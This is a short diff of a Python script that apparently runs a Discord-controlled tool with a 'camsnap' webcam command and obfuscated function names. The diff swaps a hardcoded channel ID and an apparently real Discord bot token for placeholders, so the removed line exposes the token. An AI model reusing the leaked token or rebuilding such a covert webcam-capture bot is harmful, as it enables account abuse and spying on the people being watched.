@@ -8,7 +8,7 @@ import cv2
 from datetime import datetime
 import shutil
 
-channel_id = 1172492545369055275
+channel_id = "22321232"
 username = os.getlogin()
 
 def dossssssss():
@@ -137,4 +137,4 @@ async def camsnap(ctx):
 def do_nothissssssssssssssssssssssssssssssssssnsg_personal():
     var = "sjdhsawqededwefdwefwfwefwdfrewefdfvewdsfvewdsfewfsjhfwkjehiwjhfbkwjenkwjewkfebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfwejkbfwekjbfwejkbfkwebfwekjdddddddddddddddddddddddddddddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    
-bot.run('MTE3MjQ5Mjg1NjY4NzA2NzE1Ng.GY6cds.nY6Ybdn3ptXP_HgA6YT0Bw8nYcBnCgOADe5TVg',log_handler=None)
+bot.run('Your Bot Token',log_handler=None)
